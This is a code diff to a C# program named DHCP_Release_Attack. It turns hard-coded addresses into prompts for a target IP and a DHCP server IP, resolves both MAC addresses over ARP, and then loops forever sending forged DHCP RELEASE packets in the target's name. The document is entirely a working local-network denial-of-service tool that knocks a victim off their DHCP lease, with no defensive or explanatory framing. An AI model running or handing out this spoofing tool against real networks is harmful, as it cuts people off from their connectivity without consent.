@@ -11,7 +11,9 @@ namespace DHCP_Release_Attack
 {
     class Program
     {
+        private static Interface localInterface = new Interface();
         private static ICaptureDevice device;
+
         static void Main(string[] args)
         {
             // Retrieve the device list
@@ -57,10 +59,34 @@ namespace DHCP_Release_Attack
                 throw new InvalidOperationException("unknown device type of " + device.GetType().ToString());
             }
 
+            //--User Input Settings
+            Console.Write("Target IP-Address: ");
+            IPAddress targetIpAddress = IPAddress.Parse(Console.ReadLine());
+
+            Console.Write("DHCP-Server IP-Adress: ");
+            IPAddress dhcpServIpAddress = IPAddress.Parse(Console.ReadLine());
+
+            Console.Write("Sending delay (in ms): ");
+            string sendingDelay = Console.ReadLine();
+
+
+            //--GET Hw-Address from Target and DHCP-Server
+            Console.WriteLine("Getting Hw-Addresses from Hosts...");
+
+            PhysicalAddress targetHwAddress = PhysicalAddress.Parse(localInterface.sendArpRequest(targetIpAddress));
+            PhysicalAddress dhcpServHwAddress = PhysicalAddress.Parse(localInterface.sendArpRequest(dhcpServIpAddress));
+
+            //--Print Out Hw-Addresses
+            Console.WriteLine("Target Hw-Address: " + targetHwAddress);
+            Console.WriteLine("DHCP-Server Hw-Address: " + dhcpServHwAddress);
+            
+            Console.WriteLine("Press ENTER to start...");
+            Console.Read();
+
             while (true)
             {
-                sendDhcpRelease(PhysicalAddress.Parse("5E-31-5A-76-A9-17"), IPAddress.Parse("192.168.178.90"), PhysicalAddress.Parse("E0-28-6D-5E-36-B6"), IPAddress.Parse("192.168.178.1"));
-                Thread.Sleep(20);
+                sendDhcpRelease(targetHwAddress, targetIpAddress, dhcpServHwAddress, dhcpServIpAddress);
+                Thread.Sleep(Convert.ToInt32(sendingDelay));
             }           
         }
 
@@ -80,18 +106,18 @@ namespace DHCP_Release_Attack
             const ushort udpDestinationPort = 67;
             var udpPacket = new UdpPacket(udpSourcePort, udpDestinationPort);
 
-            //-- Combine all bytes to single byte
-            byte[] payload = buildDhcpReleasePacket(pSourceIpAddress, pSourceHwAddress);
+            //-- Combine all bytes to single payload
+            byte[] payload = buildDhcpReleasePacket(pSourceIpAddress, pSourceHwAddress, pDestinationIpAddress);
 
             udpPacket.PayloadData = payload;
             ipPacket.PayloadPacket = udpPacket;
             ethernetPacket.PayloadPacket = ipPacket;
 
             device.SendPacket(ethernetPacket);
-            Console.WriteLine("DHCP Release successful send " + DateTime.Now.ToShortTimeString());
+            Console.WriteLine("DHCP Release successful send to: " + pDestinationIpAddress + " from: " + pDestinationIpAddress + " at: " + DateTime.Now.ToShortTimeString());
         }
 
-        private static byte[] buildDhcpReleasePacket(IPAddress pClientIpAddress, PhysicalAddress pClientHwAddress)
+        private static byte[] buildDhcpReleasePacket(IPAddress pClientIpAddress, PhysicalAddress pClientHwAddress, IPAddress pDestinationIpAddress)
         {
             Random rand = new Random();
             byte[] _transactionID = new byte[4];
@@ -101,9 +127,12 @@ namespace DHCP_Release_Attack
             {
                 transactionID = _transactionID,
                 clientIP = pClientIpAddress.GetAddressBytes(),
-                clientMac = pClientHwAddress.GetAddressBytes(),                
-            };
+                clientMac = pClientHwAddress.GetAddressBytes(),
 
+                dhcpServIdValue = pDestinationIpAddress.GetAddressBytes(),
+                clientIdValue = pClientHwAddress.GetAddressBytes(),
+            };
+            
             return dhcpReleasePacket.buildPacket();
         }
     }
